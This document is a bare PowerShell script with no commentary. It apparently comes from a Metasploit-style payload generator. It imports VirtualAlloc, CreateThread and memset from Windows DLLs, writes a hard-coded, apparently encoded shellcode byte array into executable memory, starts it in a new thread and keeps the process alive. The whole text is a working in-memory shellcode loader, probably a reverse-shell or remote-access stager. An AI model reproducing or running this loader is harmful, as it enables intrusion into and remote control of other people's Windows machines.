
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x79,0xcb,0xf3,0xb8,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xc7,0x04,0x03,0x57,0x76,0x29,0x06,0x44,0x60,0x2f,0xe9,0xb5,0x70,0x50,0x63,0x50,0x41,0x50,0x17,0x10,0xf1,0x60,0x53,0x74,0xfd,0x0b,0x31,0x6d,0x76,0x79,0x9e,0x82,0x3f,0x34,0xf8,0xad,0xc0,0x65,0x38,0xaf,0x42,0x74,0x6d,0x0f,0x7b,0xb7,0x60,0x4e,0xbc,0xaa,0x89,0x02,0x15,0xa0,0x3c,0xb3,0x12,0xfc,0xfc,0x38,0x68,0x10,0x85,0xdd,0x38,0x13,0xa4,0x73,0x33,0x4a,0x66,0x75,0x90,0xe6,0x2f,0x6d,0xf5,0xc3,0xe6,0x06,0xcd,0xb8,0xf8,0xce,0x1c,0x40,0x56,0x2f,0x91,0xb3,0xa6,0x77,0x15,0x2c,0xdd,0x81,0x66,0xd1,0xe6,0x55,0x15,0x0d,0x62,0x4e,0xbd,0xc6,0xd4,0xaa,0x3c,0x0a,0x82,0x39,0x32,0xe7,0xc0,0x66,0x56,0xf6,0x05,0x1d,0x62,0x73,0xa8,0xf2,0xe3,0xc7,0x8f,0xd6,0xa8,0x9c,0xae,0x4f,0x14,0x72,0xce,0x90,0xf7,0x2b,0x6a,0xda,0x15,0x3f,0x07,0x81,0x71,0x8c,0x2a,0x3a,0x81,0x9a,0x3d,0x49,0xb3,0x05,0x96,0xc5,0xff,0xce,0x30,0x11,0x00,0xe5,0x85,0x8d,0xff,0x06,0xf6,0x84,0x3b,0x52,0xa6,0xbe,0xea,0xdb,0x2d,0x3f,0x13,0x0e,0xe1,0x6f,0xbb,0xe1,0x42,0xc0,0x7b,0x52,0x2b,0x0a,0x74,0x8d,0x4b,0x35,0x5f,0xa6,0xe6,0xcf,0x37,0x00,0x06,0x3b,0x3a,0xfa,0xe5,0xc4,0xd5,0xa7,0x60,0x22,0xbf,0x47,0x25,0xfc,0x57,0xf1,0x6c,0x76,0xc6,0xfe,0xba,0xf2,0xc8,0x75,0x49,0x02,0x86,0x7d,0x24,0x10,0x7e,0x8e,0x73,0x4a,0x28,0x91,0xa9,0xe1,0xd4,0x07,0x56,0xa0,0x83,0xbf,0x54,0x95,0xe3,0x1f,0xa6,0xf0,0x78,0xa9,0x32,0xbb,0x16,0xd6,0xd2,0x3b,0xe6,0x80,0xb8,0x3b,0x8e,0x74,0x99,0x6f,0xab,0x7a,0x34,0x1c,0x60,0xef,0xb7,0x75,0xd5,0xb8,0xdf,0x7b,0x00,0x8e,0x7f,0x83,0x67,0x0e,0x43,0x52,0x41,0x64,0xad,0x66;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
